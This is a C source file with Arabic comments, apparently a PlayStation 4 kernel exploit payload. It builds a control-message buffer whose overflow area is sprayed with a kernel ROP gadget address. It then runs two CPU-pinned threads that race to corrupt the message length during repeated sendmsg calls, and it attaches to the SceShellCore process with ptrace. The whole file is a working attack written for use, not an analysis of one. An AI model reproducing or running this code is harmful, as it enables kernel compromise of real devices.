#include <ps4.h>

// إعدادات الاستغلال
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 1024 
#define NCMSG         14
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

// تعريف الثوابت لـ ptrace إذا لم تكن في الهيدر
#ifndef PT_CONTINUE
#define PT_CONTINUE 7
#endif

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;
uint32_t current_delay = 50;

// --- 1. بناء البفر بالرش الكثيف (Dense Spray) ---
void BuildPrecisionBuffer(uint64_t kbase) {
    printf_debug("[BUILD] Spraying Gadgets (Dense Mode)...\n");
    
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
    
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, 0x0002 | 0x1000, -1, 0);
    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;

    // الرش التصاعدي من الإزاحة 0 لسد ثغرة RIP: 0
    for (int i = 0; i < OVERFLOW_SIZE - 8; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }

    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_type = 7;
    }
}

// --- 2. خيط التخريب (Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg;
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i = 0; i < current_delay; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i = 0; i < 60; i++);

        current_delay++;
        if (current_delay > 1500) current_delay = 50; 
    }
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    while (!stop_race) {
        n_tries++;
        syscall(28, bad_fd, &msg, 0); 
        
        if (errno == 14) { 
            stop_race = 1;
            printf_debug("[SUCCESS] *** EFAULT CAUGHT! ***\n");
            break;
        }
        
        if (n_tries % 250000 == 0) {
            printf_debug("[INFO] Tries: %llu, Delay: %u\n", n_tries, current_delay);
        }
    }
    return NULL;
}

// --- المدخل الرئيسي ---
int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc(); initSysUtil();
    
    printf_debug("\n--- [PS4 TARGETED ATTACH + CONTINUE] ---\n");

    // البحث عن SceShellCore
    int targetPID = findProcess("SceShellCore");
    if (targetPID > 0) {
        printf_debug("[INFO] Found ShellCore (PID: %d). Attaching...\n", targetPID);
        procAttach(targetPID);
        
        // استئناف العملية فوراً لضمان عدم حدوث Freeze للواجهة
        // نستخدم ptrace المباشر لضمان وصول الإشارة
        ptrace(PT_CONTINUE, targetPID, (void *)1, 0); 
        printf_debug("[INFO] Attached and PT_CONTINUE sent.\n");
    }

    uint64_t kbase = get_kernel_base();
    BuildPrecisionBuffer(kbase);

    cpuset_t cpuset1, cpuset2;
    CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1); 
    CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2); 

    ScePthread wrid, exid;
    
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);

    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
    pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);

    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    if (targetPID > 0) {
        procDetach(targetPID);
        printf_debug("[INFO] Detached. Exploit Complete.\n");
    }

    return 0;
}
